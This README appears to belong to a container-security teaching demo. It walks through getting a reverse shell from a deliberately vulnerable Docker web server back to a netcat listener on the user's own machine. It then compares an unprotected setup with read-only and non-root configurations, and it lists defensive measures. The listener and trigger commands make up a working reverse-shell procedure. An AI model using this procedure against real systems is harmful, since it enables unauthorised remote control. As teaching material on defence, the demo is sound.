# README

Demonstrates getting access into a container using a reverse shell.  

📝 TODO:

* Is it possible to escape the read-only and run tools in the package lists?  

## Purpose

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using a reverse shell, can be initiated by the victim's machine.  

This technique is commonly used in various cybersecurity attacks and penetration testing scenarios where the attacker wants to bypass firewall restrictions. Traditional shell access might be blocked by the victim's firewall, but in many cases, outgoing connections (as would be initiated by a reverse shell) are allowed.  

In a reverse shell scenario, the victim machine, once compromised, will reach out and connect to the attacker’s machine. Once that connection is established, the attacker can execute commands on the victim machine, thereby taking control over it.  

## Protection

*Least Privileges Principle*: Only give the minimum necessary permissions to your containers. For instance, avoid running containers as root whenever possible. This will limit what an attacker can do even if they manage to compromise a container.  

*Firewall and Network Policies*: Implement strong network policies to control the traffic going in and out of your containers. An egress filtering firewall will help prevent a reverse shell from reaching back to an attacker. You can also make use of network policies in Kubernetes.  

*Container Scanning*: Use container scanning tools to identify any known vulnerabilities in your containers. Regularly update and patch your container images to eliminate these vulnerabilities.  

*Use Trusted Images*: Only use container images from trusted sources. This helps to ensure that you are not inadvertently including malicious software in your containers.  

*Implement a WAF (Web Application Firewall)*: This can protect your application by filtering and monitoring HTTP traffic between a web application and the Internet.  

*Runtime Security*: Implement a runtime security model. This can help to detect and prevent malicious activity during the operation of a container.  

*Regular Auditing and Monitoring*: Regularly audit and monitor your container's activities. Any abnormal activity could be a sign of an intrusion.  

*Intrusion Detection System (IDS)*: IDS can monitor network traffic and system logs for suspicious activities.  

## Configure

Find your local machine IP address.  

```sh
#MacOS
LOCAL_IP=$(ifconfig en0 inet | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -n 1)  
echo ${LOCAL_IP}
```

## No Protection

No protection means that once connected to the container you can install software because the container has privileges.  

### Terminal Shell 1

Run the stupid webserver and configure to callback to a server.  

```sh
docker build --target no_protection -t reverseshell . 

# Make sure that LOCAL_IP is set
docker run --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Terminal Shell 2

Run the callback service in a seperate shell. This is the service that we connect back to from the container.  

```sh
nc -l 8888 -vvv 
```

### Terminal Shell 3

Invoke the exploit against the web server and then check terminal 2.  

```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents.  
You will see a bash prompt that is connected to the container.  

```sh
# Try and install something.
apt install curl

# Exiting will kill the container process
exit
```

## Readonly

### Shell 1

Run the container with `--read-only` preventing write to disk.  

```sh
docker build --target no_protection -t reverseshell .

# Make sure that LOCAL_IP is set
docker run --read-only --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2

Run the callback service in a seperate shell  

```sh
nc -l -p 8888 -vvv 
```

### Shell 3

Invoke the exploit against the web server  

```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents.  
You will see a bash prompt that is connected to the container.  

```sh
# Try and install something - but this time it FAILS.
apt install curl

# Exiting will kill the container process
exit
```

## Nonroot

Using a non-root user in the container to reduce privilege levels.  

### Shell 1

Build and run a non-root user image.  

```sh
docker build --target non_root -t reverseshell .

# Make sure that LOCAL_IP is set
docker run --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

### Shell 2

Run the callback service in a seperate shell

```sh
nc -l -p 8888 -vvv 
```

### Shell 3

Invoke the exploit against the web server

```sh
curl localhost:8080
```

Now go back to shell 2 running the callback and list the contents.  
You will see a bash prompt that is connected to the container.  

```sh
# You're webuser now.
whoami
# Try and install something - but this time it FAILS.
apt install curl

# Exiting will kill the container process
exit
```

## Troubleshooting  

Test with a simple webservice  

```sh
docker run -it --rm -p 8080:8080 --entrypoint /bin/bash reverseshell

echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 8080 -q 1

curl localhost:8080
```

## Resources
